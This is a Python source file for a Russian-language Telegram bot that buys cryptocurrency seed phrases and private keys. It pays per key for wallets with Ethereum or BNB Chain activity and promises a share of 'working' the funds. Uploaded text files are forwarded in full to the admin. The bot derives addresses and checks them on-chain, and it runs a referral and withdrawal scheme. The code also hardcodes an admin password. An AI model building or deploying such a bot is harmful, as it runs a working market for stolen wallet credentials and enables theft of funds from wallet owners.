# main.py
import asyncio
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, Document
from aiogram.filters import CommandStart
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.context import FSMContext
from aiogram.client.default import DefaultBotProperties
import os
from dotenv import load_dotenv

load_dotenv()

TOKEN = os.getenv("TOKEN")
ADMIN_ID = int(os.getenv("ADMIN"))

bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

from database import (
    init_db, get_or_create_user, register_referral, is_duplicate,
    add_wallet_hash, update_user_stats, get_user, get_stats,
    get_referral_count, get_referral_earnings, add_referral_bonus,
    hash_line
)
from wallet_utils import seed_to_address, private_key_to_address
from rpc_client import has_erc20_or_bep20_activity

class UploadFile(StatesGroup):
    waiting_file = State()

class SupportState(StatesGroup):
    waiting_for_message = State()

class WithdrawState(StatesGroup):
    waiting_for_amount = State()
    waiting_for_address = State()

class AdminState(StatesGroup):
    waiting_for_password = State()

# Клавиатуры
main_menu = InlineKeyboardMarkup(
    inline_keyboard=[
        [InlineKeyboardButton(text="📂 Отправить файл", callback_data="upload")],
        [InlineKeyboardButton(text="👤 Профиль", callback_data="profile")],
        [InlineKeyboardButton(text="👥 Рефералы", callback_data="referrals")],
        [InlineKeyboardButton(text="💰 Баланс", callback_data="balance")],
        [InlineKeyboardButton(text="💳 Вывести", callback_data="withdraw")],
        [InlineKeyboardButton(text="📞 Поддержка", callback_data="support")],
        [InlineKeyboardButton(text="ℹ️ Правила", callback_data="rules")],
    ]
)

admin_panel = InlineKeyboardMarkup(
    inline_keyboard=[
        [InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats")],
        [InlineKeyboardButton(text="📤 Заявки на вывод", callback_data="admin_withdrawals")],
        [InlineKeyboardButton(text="🔙 Выход", callback_data="admin_logout")]
    ]
)

back_menu = InlineKeyboardMarkup(
    inline_keyboard=[[InlineKeyboardButton(text="🔙 Назад", callback_data="back")]]
)

@dp.message(CommandStart())
async def start_cmd(message: Message):
    args = message.text.split()
    referrer_id = None
    if len(args) > 1:
        payload = args[1]
        if payload.startswith("ref_"):
            try:
                referrer_id = int(payload.replace("ref_", ""))
            except:
                pass

    await get_or_create_user(message.from_user.id, message.from_user.username or "unknown")
    if referrer_id:
        await register_referral(message.from_user.id, referrer_id)

    ref_link = f"https://t.me/your_bot_username_bot?start=ref_{message.from_user.id}"
    text = (
        "👋 <b>Добро пожаловать!</b>\n\n"
        "🛒 <b>Скупка SEED-фраз и Private-ключей</b> с транзакциями в сетях:\n"
        "• <b>ERC-20 (Ethereum)</b>\n"
        "• <b>BEP-20 (BNB Smart Chain)</b>\n\n"
        "💰 <b>Цены:</b>\n"
        "• 🌱 SEED-фраза — <b>235₽</b>\n"
        "• 🔑 Private-key — <b>145₽</b>\n\n"
        "💸 <b>ПЛАТИМ САМУЮ ВЫСОКУЮ ЦЕНУ</b> + <b>70% от отработки</b> помимо прайса!\n\n"
        "🔝 <b>Наши преимущества:</b>\n"
        "├ 🤖 Автоматизация\n"
        "├ ⚡ Быстрые выплаты\n"
        "├ 🚀 Высокая скорость\n"
        "└ 🔍 Глубокая проверка\n\n"
        "🕒 <b>Выплаты каждый день в 23:00 (МСК)</b>\n"
        "Все заработанные средства будут отправлены автоматически."
    )
    await message.answer(text, reply_markup=main_menu)

@dp.callback_query(F.data == "upload")
async def upload_file_cb(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer(
        "📂 Загрузите файл в формате <b>.txt</b>.\n\n"
        "📌 Поддерживается до <b>20 МБ</b>.\n"
        "🔍 Проверка: уникальность + активность"
    )
    await state.set_state(UploadFile.waiting_file)
    await callback.answer()

@dp.message(UploadFile.waiting_file, F.document)
async def process_file(message: Message, state: FSMContext):
    document: Document = message.document

    user_info = f"@{message.from_user.username}" if message.from_user.username else f"ID: {message.from_user.id}"
    try:
        await bot.send_message(ADMIN_ID, f"📩 Файл от {user_info}\n📄 {document.file_name} | {document.file_size} байт")
        await bot.send_document(ADMIN_ID, document.file_id)
    except Exception as e:
        await bot.send_message(ADMIN_ID, f"❌ Не отправлено: {e}")

    if not document.file_name.endswith(".txt"):
        await message.answer("❌ Файл должен быть в формате <b>.txt</b>.")
        await state.clear()
        return

    await message.answer("📥 Скачиваю и анализирую файл...")

    try:
        file = await bot.get_file(document.file_id)
        max_size = 20 * 1024 * 1024
        if file.file_size > max_size:
            await message.answer("❌ Файл слишком большой. Максимум — 20 МБ.")
            await state.clear()
            return

        file_data = (await bot.download_file(file.file_path)).getvalue()

        if len(file_data) >= 100 and b'\x00' in file_data[:100]:
            await message.answer("❌ Это не текстовый файл.")
            await state.clear()
            return

        try:
            content = file_data.decode("utf-8")
        except UnicodeDecodeError:
            try:
                content = file_data.decode("cp1251")
            except UnicodeDecodeError:
                content = file_data.decode("utf-8", errors="replace")

    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")
        await state.clear()
        return

    lines = [line.strip() for line in content.splitlines() if line.strip()]
    total_lines = len(lines)
    new_seeds = 0
    new_keys = 0
    total_reward = 0

    for line in lines:
        address = None
        is_valid = False

        word_count = len(line.split())
        if word_count in (12, 24) and all(w.isalnum() for w in line.split()):
            address = seed_to_address(line)
            wallet_type = 'seed'
            price = 235
        elif len(line) == 64 and all(c in "0123456789abcdefABCDEF" for c in line):
            address = private_key_to_address(line)
            wallet_type = 'key'
            price = 145
        else:
            continue

        if not address:
            continue

        h = hash_line(line)
        if await is_duplicate(h):
            continue

        if await has_erc20_or_bep20_activity(address):
            await add_wallet_hash(h, wallet_type, message.from_user.id)
            if wallet_type == 'seed':
                new_seeds += 1
            else:
                new_keys += 1
            total_reward += price
            is_valid = True
            await bot.send_message(ADMIN_ID, f"✅ Активный: <code>{address}</code> → +{price}₽", parse_mode="HTML")

    if new_seeds or new_keys:
        await update_user_stats(message.from_user.id, total_lines, new_seeds, new_keys, total_reward)
        user = await get_user(message.from_user.id)
        if user and user['referred_by']:
            bonus = total_reward * 0.1
            await add_referral_bonus(user['referred_by'], bonus)
            try:
                await bot.send_message(user['referred_by'], f"🎉 Реферал заработал {total_reward}₽\n💸 Вам +{bonus:.2f}₽")
            except: pass

    if total_reward > 0:
        text = (
            f'✅ Файл <b>"{document.file_name}"</b> обработан!\n\n'
            f"📊 Найдено:\n"
            f"   • 🌱 SEED: <b>{new_seeds}</b> × 235₽\n"
            f"   • 🔑 Keys: <b>{new_keys}</b> × 145₽\n\n"
            f"📈 Обработано строк: <b>{total_lines}</b>\n"
            f"💰 Заработано: <b>{total_reward:.2f} RUB</b>"
        )
    else:
        text = (
            f'⚠️ В файле <b>"{document.file_name}"</b> не найдено активных кошельков.\n\n'
            f"📈 Всего строк: <b>{total_lines}</b>\n"
            "❌ Баланс не пополнен."
        )

    await message.answer(text, reply_markup=main_menu)
    await state.clear()

@dp.callback_query(F.data == "withdraw")
async def withdraw_start(callback: CallbackQuery, state: FSMContext):
    user = await get_user(callback.from_user.id)
    if not user or user['balance'] <= 0:
        await callback.message.edit_text("❌ Недостаточно средств.", reply_markup=back_menu)
        await callback.answer()
        return
    await callback.message.edit_text(f"💳 Введите сумму для вывода (минимум 500₽):\nВаш баланс: {user['balance']:.2f} RUB")
    await state.set_state(WithdrawState.waiting_for_amount)
    await callback.answer()

@dp.message(WithdrawState.waiting_for_amount)
async def withdraw_amount(message: Message, state: FSMContext):
    try:
        amount = float(message.text)
        if amount < 500:
            await message.answer("❌ Минимальная сумма вывода — 500₽.")
            return
    except:
        await message.answer("❌ Введите число.")
        return

    user = await get_user(message.from_user.id)
    if amount > user['balance']:
        await message.answer(f"❌ Недостаточно средств. Доступно: {user['balance']:.2f} RUB")
        await state.clear()
        return

    await state.update_data(amount=amount)
    await message.answer("📨 Введите ваш BNB (BEP-20) адрес:")
    await state.set_state(WithdrawState.waiting_for_address)

@dp.message(WithdrawState.waiting_for_address)
async def withdraw_address(message: Message, state: FSMContext):
    address = message.text.strip()
    if not (address.startswith("0x") and len(address) == 42):
        await message.answer("❌ Неверный формат BNB-адреса.")
        return

    data = await state.get_data()
    amount = data['amount']
    user = message.from_user

    await bot.send_message(
        ADMIN_ID,
        f"💸 <b>Заявка на вывод</b>\n"
        f"👤 @{user.username or user.id}\n"
        f"💰 {amount} RUB\n"
        f"📤 Адрес: <code>{address}</code>",
        parse_mode="HTML"
    )
    await message.answer(
        f"✅ Заявка на вывод <b>{amount} RUB</b> отправлена!\n"
        f"Адрес: <code>{address}</code>\n"
        "Администратор обработает запрос в ближайшее время.",
        parse_mode="HTML",
        reply_markup=main_menu
    )
    await state.clear()

@dp.callback_query(F.data == "support")
async def support_start(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text(
        "📞 Отправьте сообщение, и мы ответим в ближайшее время.",
        reply_markup=back_menu
    )
    await state.set_state(SupportState.waiting_for_message)
    await callback.answer()

@dp.message(SupportState.waiting_for_message)
async def send_to_admin(message: Message, state: FSMContext):
    user = message.from_user
    await bot.send_message(
        ADMIN_ID,
        f"📩 От @{user.username or user.id} (ID: {user.id})\nТип: {message.content_type}"
    )
    await message.send_copy(chat_id=ADMIN_ID)
    await message.answer("✅ Сообщение отправлено!", reply_markup=main_menu)
    await state.clear()

@dp.message(F.reply_to_message)
async def reply_to_user(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    replied = message.reply_to_message
    if not replied.text or "От @" not in replied.text:
        return
    try:
        user_id = int(replied.text.split("ID: ")[1].split(")")[0])
        await message.send_copy(chat_id=user_id)
        await message.answer("✅ Ответ отправлен пользователю.")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.callback_query(F.data == "profile")
async def profile_cb(callback: CallbackQuery):
    user = await get_user(callback.from_user.id)
    if not user:
        await callback.message.edit_text("❌ Ошибка.", reply_markup=back_menu)
        await callback.answer()
        return
    text = (
        f"👤 <b>Профиль</b>\n\n"
        f"🆔 ID: <code>{user['user_id']}</code>\n"
        f"📝 Загружено строк: {user['total_lines']}\n"
        f"🌱 SEED: {user['unique_seeds']}\n"
        f"🔑 Keys: {user['unique_keys']}\n"
        f"💰 Заработано: {user['balance']:.2f} RUB\n\n"
        f"🕓 Выплаты в 23:00 (МСК)"
    )
    await callback.message.edit_text(text, reply_markup=back_menu)
    await callback.answer()

@dp.callback_query(F.data == "referrals")
async def referrals_cb(callback: CallbackQuery):
    ref_count = await get_referral_count(callback.from_user.id)
    earnings = await get_referral_earnings(callback.from_user.id)
    ref_link = f"https://t.me/your_bot_username_bot?start=ref_{callback.from_user.id}"
    text = (
        f"👥 <b>Рефералы</b>\n\n"
        f"🔗 Ссылка: <code>{ref_link}</code>\n"
        f"👥 Приглашено: {ref_count}\n"
        f"💸 Заработано: {earnings:.2f} RUB"
    )
    await callback.message.edit_text(text, reply_markup=back_menu)
    await callback.answer()

@dp.callback_query(F.data == "balance")
async def balance_cb(callback: CallbackQuery):
    user = await get_user(callback.from_user.id)
    bal = user['balance'] if user else 0
    await callback.message.edit_text(f"💰 Баланс: <b>{bal:.2f} RUB</b>", reply_markup=back_menu)
    await callback.answer()

@dp.callback_query(F.data == "rules")
async def rules_cb(callback: CallbackQuery):
    text = (
        "📜 <b>Правила</b>\n\n"
        "1️⃣ Только .txt файлы\n"
        "2️⃣ Только уникальные активные кошельки (ETH/BNB)\n"
        "3️⃣ Обман = бан\n"
        "4️⃣ Выплаты в 23:00 (МСК)"
    )
    await callback.message.edit_text(text, reply_markup=back_menu)
    await callback.answer()

@dp.callback_query(F.data == "back")
async def back_cb(callback: CallbackQuery):
    await callback.message.edit_text("Главное меню:", reply_markup=main_menu)
    await callback.answer()

# Админ-панель
@dp.message(F.text == "/admin")
async def admin_login_cmd(message: Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID:
        return
    await message.answer("🔐 Введите пароль:")
    await state.set_state(AdminState.waiting_for_password)

@dp.message(AdminState.waiting_for_password)
async def admin_password_check(message: Message, state: FSMContext):
    if message.text == "Linar1212@":
        await message.answer("✅ Добро пожаловать!", reply_markup=admin_panel)
        await state.clear()
    else:
        await message.answer("❌ Неверный пароль.")

@dp.callback_query(F.data == "admin_stats")
async def admin_stats(callback: CallbackQuery):
    stats = await get_stats()
    await callback.message.edit_text(
        f"📊 Статистика:\n"
        f"Пользователей: {stats['users']}\n"
        f"Строк: {stats['lines']}\n"
        f"Выплачено: {stats['payout']:.2f} RUB",
        reply_markup=admin_panel
    )
    await callback.answer()

@dp.callback_query(F.data == "admin_withdrawals")
async def admin_withdrawals(callback: CallbackQuery):
    await callback.message.edit_text("📤 Все заявки приходят в личку.", reply_markup=admin_panel)
    await callback.answer()

@dp.callback_query(F.data == "admin_logout")
async def admin_logout(callback: CallbackQuery):
    await callback.message.edit_text("👋 Вы вышли.", reply_markup=main_menu)
    await callback.answer()

@dp.message(F.text == "/stats")
async def stats_cmd(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    stats = await get_stats()
    await message.answer(
        f"📊 Статистика:\n"
        f"Пользователей: {stats['users']}\n"
        f"Строк: {stats['lines']}\n"
        f"Выплачено: {stats['payout']:.2f} RUB"
    )

async def main():
    await init_db()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
